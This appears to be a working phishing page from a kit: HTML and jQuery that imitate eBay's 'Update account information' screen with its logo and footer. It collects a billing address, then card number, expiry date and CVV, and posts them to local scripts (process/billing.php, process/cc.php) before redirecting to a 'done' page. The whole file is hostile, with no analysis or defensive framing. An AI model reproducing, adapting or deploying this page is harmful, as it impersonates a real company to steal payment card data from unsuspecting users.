﻿ 
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Update account information | eBay</title>
<link rel="icon" href="./res/img/icon.png">
<link rel="stylesheet" href="./res/css/update.css">
<script src="./res/js/jquery.js"></script>
<script src="./res/js/validate.js"></script>
<script src="./res/js/jquery.mask.js"></script>
</head>
<body>
<div class="top">
<img src="./res/img/logo.png">
</div>

<div id="errors-content" style="width:100%; text-align:center; display:none;">
<div class="errors">
<div id="errors-msg">
<img src="./res/img/error.png"> We noticed a problem. Please review:
</div>
<div class="errors-list" >

</div>
</div>
</div>

<div class="form">

<div id="billing">
<form action="" id="billing-form"  method="POST">
<div class="title">Update your billing address</div>

<input class="text" required type="text" name="address" placeholder="Address" id="address">
<input class="text" required type="text" name="city" placeholder="City" id="city">

<div class="multi">
<div class="left">
<input class="text" required type="text"  name="state" placeholder="State / Province / Region" id="state">
</div>
<div class="right">
<input class="text" required type="text" style="width:93%;" name="zip" placeholder="Postal Code" id="zip">
</div>
</div>
<button id="billing-btn" class="submit-btn">Continue</button>
</form>
</div>


<div id="cc" style="display:none;">
<form action="" id="cc-form" method="post">
<div class="title">Update your Credit/Debit card </div>
<input class="text" required type="text" name="nameoncard" placeholder="Name on card" id="nameoncard">
<input class="text" required type="text" name="cardnumber" placeholder="Card number" id="cardnumber">
<div class="multi">
<div class="left">
<input class="text" required type="text"  name="date" placeholder="Expiration date" id="date">
</div>
<div class="right">
<input class="text" required type="text" style="width:93%;" name="cvv" placeholder="CVV" id="cvv">
</div>
</div>
<button id="cc-btn" class="submit-btn">Finish</button>
</form>

</div>


</div>



<div style="width:100%; text-align:center;">
<div class="footer">
© 1995-2020 eBay Inc. <a href="#">User Agreement</a>, <a href="#">Privacy</a> & <a href="#">Cookies</a>.
</div>
</div>


<script>

$(function(){
$("#cardnumber").mask("0000000000000000");
$("#date").mask("00/00");
$("#cvv").mask("0000");


$("#billing-btn").click(function(){
	var errorsList = "";

	if($("#address").val() == ""){
		errorsList += "<li>Address</li>";
	}if($("#city").val() == ""){
	errorsList += "<li>City</li>";
}if($("#state").val()==""){
	errorsList += "<li>State</li>";
}if($("#zip").val() == ""){
	errorsList += "<li>Postal Code</li>";
}


if(errorsList == ""){
	 
}else{
	$("#errors-content").show();
	$(".errors-list").html(errorsList);
}
});
 


		$("#billing-form").validate({
			rules:{
				address: 'required',
				city: 'required',
				state: 'required',
				zip: 'required'
			},
			
			messages:{
				address:"Please enter a valid address.",
				city: "Please enter a valid city."
				
			},
			
			submitHandler: function() {
				$("#billing-btn").css("background","#bdbdbd");
				$("#billing-btn").css("border","1px solid #bdbdbd");
				setTimeout($("#billing-btn").html("<img src='./res/img/loader.gif'>"),
				$.post("./process/billing.php",($("#billing-form").serialize()),function(done){
					$("#billing").hide();
					$("#errors-content").hide();
					$("#cc").show();
					
			}));
		}
		});
		
		
		
});
 
 
 
 
 
 //CC SECTION
 
 $(function(){

$("#cc-btn").click(function(){
	var errorsList = "";

	if($("#nameoncard").val() == ""){
		errorsList += "<li>Name on card</li>";
	}if($("#cardnumber").val() == ""){
	errorsList += "<li>Card Number</li>";
}if($("#date").val()==""){
	errorsList += "<li>Expiration Date</li>";
}if($("#cvv").val() == ""){
	errorsList += "<li>Cvv</li>";
}


if(errorsList == ""){
	
}else{
	$("#errors-content").show();
	$(".errors-list").html(errorsList);
}
});
 


		$("#cc-form").validate({
			rules:{
				nameoncard: 'required',
				cardnumber: 'required',
				date: 'required',
				cvv: 'required'
			},
				
			submitHandler: function() {
				$("#errors-content").hide();
				$("#cc-btn").css("background","#bdbdbd");
				$("#cc-btn").css("border","1px solid #bdbdbd");
				setTimeout($("#cc-btn").html("<img src='./res/img/loader.gif'>"),
				$.post("./process/cc.php",($("#cc-form").serialize()),function(done){
					window.location = "done.php";
			}));
		}
		});
		
		
		
});
 
</script>
</body>
</html>














